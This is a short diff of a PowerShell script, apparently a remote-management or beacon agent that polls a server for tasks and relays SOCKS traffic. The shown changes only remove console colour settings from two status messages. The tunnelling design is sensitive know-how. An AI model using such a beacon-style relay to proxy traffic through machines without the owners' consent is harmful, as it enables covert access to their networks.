@@ -981,7 +981,7 @@ function Invoke-RmmSocksProcessWsMessage {
     if ($Message.op -eq 'tasks') {
         $taskList = Get-RmmSocksTasksFromPoll -Poll @{ active = $true; tasks = @($Message.tasks) }
         if ($taskList.Count -gt 0) {
-            Write-RmmSocksHostLine "[*] SOCKS WS: $($taskList.Count) task(s)" -ForegroundColor DarkGray
+            Write-RmmSocksHostLine "[*] SOCKS WS: $($taskList.Count) task(s)"
             $poll = @{ active = $true; tasks = $taskList }
             $result = Invoke-RmmSocksCycle -Headers $Headers -Poll $poll -EmitResponsesOnly
             if ($result.responses -and $result.responses.Count -gt 0) {
@@ -1044,7 +1044,7 @@ function Invoke-RmmSocksHttpRelay {
             }
             $cycleOk = Invoke-RmmSocksCycle -Headers $headers -Poll $poll
             if ($cycleOk -eq $false) {
-                Write-RmmSocksHostLine '[!] SOCKS cycle failed (check beacon token / server)' -ForegroundColor Yellow
+                Write-RmmSocksHostLine '[!] SOCKS cycle failed (check beacon token / server)'
             }
             Start-Sleep -Milliseconds 25
         } catch {
